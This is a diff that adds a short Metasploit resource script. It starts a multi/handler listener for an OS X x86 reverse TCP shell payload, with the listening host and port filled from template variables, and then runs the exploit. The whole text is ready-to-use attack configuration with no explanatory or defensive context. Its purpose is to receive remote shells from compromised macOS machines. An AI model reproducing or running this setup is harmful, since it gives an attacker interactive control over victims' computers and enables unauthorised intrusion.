@@ -1,0 +1,5 @@
+use exploit/multi/handler
+set payload osx/x86/shell_reverse_tcp
+set LPORT $b
+set LHOST $a  
+exploit
